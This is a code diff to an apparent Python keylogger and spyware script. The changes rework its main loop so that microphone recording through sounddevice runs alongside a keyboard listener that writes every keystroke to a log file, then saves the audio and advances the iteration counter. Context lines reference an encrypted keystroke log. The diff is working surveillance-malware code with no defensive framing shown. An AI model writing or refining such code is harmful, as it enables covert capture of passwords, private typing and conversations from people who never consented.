@@ -93,22 +93,13 @@ keys_information_enc = 'enc_keys_logged.txt'
 
 #current_date_time = datetime.now().time() # This provides human readable time. But for mathematical simplicity we use time.time()
 
-no_of_iterations = 4
+no_of_iterations = 1
 current_iteration = 0
 iteration_duration = 15
 
 while current_iteration < no_of_iterations:
-    #Microphone
-
-    sampling_freq = 44100
-    duration = iteration_duration
-
-    myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)
-    sd.wait()
-
-    write(audio_information, sampling_freq, myrecording)
-
-    # Keyboard Logging
+    
+    #Microphone & Keyboard Logging
 
     def on_press_func(key):
         try:
@@ -119,6 +110,10 @@ while current_iteration < no_of_iterations:
         except AttributeError:
             f.write('(' + str(key) + ')')
 
+    sampling_freq = 44100
+    duration = iteration_duration
+
+    myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)
 
     f = open(keys_information, 'a')
 
@@ -129,6 +124,12 @@ while current_iteration < no_of_iterations:
         listener.join()
 
     f.close()
+
+    sd.wait()
+
+    write(audio_information, sampling_freq, myrecording)
+
+    current_iteration += 1
 
     # if time.time() > stopping_time:
     #     pass
